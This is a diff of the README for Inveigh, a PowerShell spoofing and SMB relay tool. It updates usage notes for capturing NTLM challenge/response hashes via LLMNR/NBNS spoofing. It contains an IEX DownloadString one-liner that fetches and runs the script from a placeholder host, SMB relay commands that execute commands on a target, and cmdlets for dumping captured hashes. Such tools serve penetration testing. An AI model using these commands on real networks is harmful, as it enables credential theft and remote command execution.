@@ -20,19 +20,13 @@ Tested minimums are PowerShell 2.0 and .NET 3.5
 Obtain an elevated administrator or SYSTEM shell and use a method to load the module
 
 To import with Import-Module:  
-Import-Module ./Inveigh.psd1
-
-To import individual files with Import-Module
 Import-Module ./Inveigh.ps1
-Import-Module ./Inveigh-Relay.ps1
 
-To import using dot source method:  
+To import with dot source method:  
 . ./Inveigh.ps1
-. ./Inveigh-Relay.ps1
 
 To load into memory using Invoke-Expression:  
 IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh.ps1")
-IEX (New-Object Net.WebClient).DownloadString("http://yourhost/Inveigh-Relay.ps1")
 
 To execute with default settings:  
 Invoke-Inveigh
@@ -43,26 +37,23 @@ Import-Module ./Inveigh.ps1;Invoke-Inveigh
 To execute with features enabled/disabled:   
 Invoke-Inveigh -IP 'local IP' -SpoofIP 'local or remote IP' -LLMNR Y/N -NBNS Y/N -NBNSTypes 00,03,20,1B -HTTP Y/N -HTTPS Y/N -SMB Y/N -Repeat Y/N -ConsoleOutput Y/N -FileOutput Y/N -OutputDir 'valid folder path'
 
-To execute with SMB relay enabled through Invoke-Inveigh:  
+To execute with SMB relay enabled:  
 Invoke-Inveigh -SMBRelay Y -SMBRelayTarget 'valid SMB target IP' -SMBRelayCommand "valid command to run on target"
-
-To execute with SMB relay with only Invoke-InveighRelay:  
-Invoke-InveighRelay -SMBRelayTarget 'valid SMB target IP' -SMBRelayCommand "valid command to run on target"
 
 Use 'Get-Help -parameter * Invoke-Inveigh' for a full list of parameters
 
-# Functions
+# Cmdlets
 Invoke-Inveigh - Start Inveigh with or without parameters  
-Invoke-InveighRelay - SMB relay function  
 Get-Inveigh - Get queued console output  
 Get-InveighLog - Get log entries  
 Get-InveighNTLM - Get all captured challenge/response hashes  
 Get-InveighNTLMv1 - Get captured NTLMv1 challenge/response hashes  
 Get-InveighNTLMv2 - Get captured NTLMv2 challenge/response hashes  
 Get-InveighStats - Get captured challenge/response counts  
+Get-InveighHelp - List the cmdlets  
 Watch-Inveigh - Enable real time console output  
-Clear-Inveigh - Clear Inveigh data from memory  
-Stop-Inveigh - Stop all running Inveigh functions    
+Clear-Inveigh - Clear capture, log, smbrelay, and spoof lists  
+Stop-Inveigh - Stop Inveigh  
 
 # Screenshots
 Invoke-Inveigh execution with real time console and file output enabled
